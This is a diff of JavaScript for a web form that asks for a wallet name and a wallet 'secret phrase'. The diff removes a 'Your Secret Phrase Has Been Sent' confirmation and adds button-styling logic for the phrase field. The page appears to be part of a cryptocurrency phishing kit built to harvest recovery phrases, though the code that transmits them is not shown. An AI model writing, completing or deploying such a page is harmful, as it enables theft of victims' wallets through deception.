@@ -3,19 +3,28 @@ let secretPhrase = ""
 let error1 = false;
 let error2 = false;
 
-let confirmed = ` <div class="confirm-outer">
-                    <h2>Confirmed !!</h2>
-                    <h3>Your Secret Phrase Has Been Sent.</h3>
-                  </div>`
-
 document.querySelector(".input-box").addEventListener("change",(e)=>{
   document.querySelector(".error-box-1").classList.add("display")
   walletName = e.target.value;
 })
 
+document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
+document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"
+
 document.querySelector(".text-box").addEventListener("change",(e)=>{
   document.querySelector(".error-box-2").classList.add("display")
   secretPhrase = e.target.value;
+})
+
+document.querySelector(".text-box").addEventListener("input",(e)=>{
+  if(e.target.value.length === 0){
+    document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
+    document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"
+  }
+  else{
+    document.querySelector(".button").style.backgroundColor = "rgb(92, 165, 248)"
+    document.querySelector(".button").style.color = "rgba(255, 255, 255, 1)"
+  }
 })
 
 function checkSecret(str){
